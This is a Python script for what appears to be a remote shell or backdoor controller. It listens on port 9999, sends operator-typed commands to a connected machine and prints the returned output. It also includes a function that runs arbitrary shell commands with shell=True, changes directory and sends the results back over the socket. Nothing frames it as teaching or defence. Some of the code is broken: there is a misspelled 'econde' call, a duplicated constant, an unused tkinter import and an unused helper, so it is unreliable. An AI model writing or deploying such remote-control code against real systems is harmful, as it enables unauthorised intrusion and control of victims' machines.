import socket
import platform, subprocess
import threading
import os
from tkinter import CURRENT

IS_WINDOWS = platform.system() == "Windows"
HOST = "0.0.0.0"
PORT = 9999
END_MARKER = "<END_OF_OUTPUT>"
CURRENT_DIR = os.getcwd()
END_MARKER = "<END_OF_OUTPUT>"

def run_in_shell(command, cwd):
    if IS_WINDOWS:
        cmd = ["powershell.exe", "-NoProfile", "-Command", command]
    else:
        cmd = ["/bin/sh", "-lc", command]
    return subprocess.run(cmd, capture_output=True, text=True, cwd=cwd)

def execute_command(s, command):
    global CURRENT_DIR

    stripped = command.strip()
    if stripped == "":
        s.sendall((""+END_MARKER).econde())
        return
    
    if stripped == "cd" or stripped.startswith("cd"):
        target = stripped[2:].strip()
        if target == "":
            target = os.path.expanduser("~")

        target = os.path.expandvars(os.path.expanduser(target))
        if not os.path.isabs(target):
            target = os.path.normpath(os.path.join(CURRENT_DIR, target))
        try:
            if os.path.isdir(target):
                CURRENT_DIR = target
                s.sendall((f"Changed directory to: {CURRENT_DIR}\n"+END_MARKER).encode())
            else:
                s.sendall((f"cd: no such directory: {target}\n"+END_MARKER).encode())
        except Exception as e:
            s.sendall((f"cd: {e}\n"+END_MARKER).encode())
        return
    result = subprocess.run(command, capture_output=True, text=True, shell=True, cwd=CURRENT_DIR)
    output = result.stdout if result.stdout else result.stderr
    s.sendall((output + END_MARKER).encode())

 

def recv_loop(conn):
    buf = ""
    while True:
        chunk = conn.recv(4096)
        if not chunk:
            print("\nClient Disconnected")
            break
        buf += chunk.decode()
        while END_MARKER in buf:
            out, buf = buf.split(END_MARKER, 1)
            if out:
                print(f"\n{out}", end="")
            print("Enter a command: ", end="", flush=True)

server = socket.socket()
server.bind((HOST, PORT))
server.listen(5)

conn, addr = server.accept()
print(f"Connected to client: {addr}")
threading.Thread(target=recv_loop, args=(conn,), daemon=True).start()


while True:
    cmd = input("Enter a command: ")
    if not cmd.strip():
        continue
    conn.send(cmd.encode())

    